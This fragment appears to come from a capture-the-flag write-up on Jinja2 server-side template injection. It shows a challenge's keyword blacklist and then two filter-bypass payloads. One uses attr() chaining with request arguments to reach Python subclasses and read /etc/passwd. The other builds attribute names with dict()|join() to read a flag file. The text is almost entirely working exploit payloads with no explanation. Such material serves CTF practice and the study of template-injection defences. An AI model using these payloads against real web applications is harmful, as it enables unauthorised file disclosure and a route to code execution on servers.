...
```
blacklist = ['os', '+', '[', ']', "'", '{}', 'add', 'chr', 'ord', 'mro', 'get', 'form', 'class', 'base', 'request', 'session', 'cookies', 'headers', 'redirect', 'url_for', 'config', 'builtins', 'subclassesget_flashed_messages']
```
...
```
{ %set%20a=((self._TemplateReference__context.parent).pop(self._TemplateReference__context.parent|list|random))% }{ {((()|attr(a.args.a)|attr(a.args.b)|attr(a.args.c)())|attr(a.args.d)(40))(a.args.e).read()} }&a=__class__&b=__base__&c=__subclasses__&d=__getitem__&e=/etc/passwd
```
...
```
{ % set a = dict(__clas=aa,s__=dd)|join() % }{ % set b = dict(__bas=aa,e__=dd)|join() % }{ % set c = dict(__subc=aa,lasses__=dd)|join() % }{ % set exp = ({ }|attr(a)|attr(b)|attr(c))().pop(40) % }{ % set flag = dict(flag=aa)|join() % }{ {exp(flag).read()} }
```
